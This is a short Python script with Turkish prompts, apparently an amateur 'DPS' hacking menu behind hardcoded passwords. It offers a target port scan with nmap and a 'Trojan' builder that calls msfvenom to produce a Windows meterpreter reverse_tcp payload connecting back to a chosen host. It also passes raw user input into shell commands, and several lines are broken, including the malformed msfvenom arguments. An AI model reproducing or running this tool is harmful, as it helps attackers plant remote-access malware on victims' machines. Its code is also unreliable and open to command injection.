import os
import time
print("-----------------------------")
os.system("figlet DPS")
print("-----------------------------")
print("########## -- DeepSoon & DeepSama -- ##########")
print("")
print("")

kadi= "DeepSama"
sifre = "hack"
kkadi = "DeepSoon"
ssifre = "hack"

ksoru = input("Kayıtlı Kullanıcı Adını Giriniz -DPS ---->  ")
ksifre = input("Kayıtlı Şifreyi Giriniz -DPS ---->  ")

if (ksoru==kadi) & (ksifre==sifre):
    print("Sisteme Giris Basarılı")
    time.sleep(1)
    os.system("figlet CONFRIME!!")
    time.sleep(1)
    os.system("clear")
    os.system("figlet DPS")
    print("3 Saniye Bekleyin...")
    print()
    print("3")
    print("")
    time.sleep(1)
    print("2")
    print("")
    time.sleep(1)
    print("1")
    print("")
    time.sleep(1)
    os.system("Sisteme Geçiş Yapılıyor....")
    os.system("clear")
    os.system("figlet WELCOME")
    print("""
1-Port Taraması
2-Trojan OLustur
""")
    islem = input("İslem Seciniz ---->  ")
    if (islem=="1"):
       hedefip = input("Hedef İP Giriniz ---->  ")
       os.system("sudo nmap -sS -sV " + hedefip)
    if (islem=="2"):
       hackHOST = input("Local İp Tanımlayınız ---->  ")
       hackPORT = input("Local Port Tanımlayınız ---->  ")
       ismin = input("Trojan İsmi Tanımlayınız(Uzantıyı Ekleyerek) ---->  ")
       print("")
       print("        --> Bu Islem 30-35 Saniye Surebilir <--")
       os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ hackHOST+" LPORT"+ hackPORT+" -o "+ismin)

if (ksoru==kkadi) & (ksifre==ssifre):
    print("Sisteme Giris Basarılı")
    time.sleep(1)
    os.system("figlet CONFRIME!!")
    time.sleep(1)
    os.system("clear")
    os.system("figlet DPS")
    print("3 Saniye Bekleyin...")
    print()
    print("3")
    print("")
    time.sleep(1)
    print("2")
    print("")
    time.sleep(1)
    print("1")
    print("")
    time.sleep(1)
    os.system("Sisteme Geçiş Yapılıyor....")
    os.system("clear")
    os.system("figlet WELCOME")
    print("""
1-Port Taraması
2-Trojan OLustur
""")
    islem = input("İslem Seciniz ---->  ")
    if (islem=="1"):
       hedefip = input("Hedef İP Giriniz ---->  ")
       os.system("sudo nmap -sS -sV " + hedefip)
    if (islem=="2"):
       hackHOST = input("Local İp Tanımlayınız ---->  ")
       hackPORT = input("Local Port Tanımlayınız ---->  ")
       ismin = input("Trojan İsmi Tanımlayınız(Uzantıyı Ekleyerek) ---->  ")
       print("")
       print("        --> Bu Islem 30-35 Saniye Surebilir <--")
       os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ hackHOST+" LPORT"+ hackPORT+" -o "+ismin)
else:
    os.system("clear")
    time.sleep(1)
    os.system("figlet ERROR!!")
    


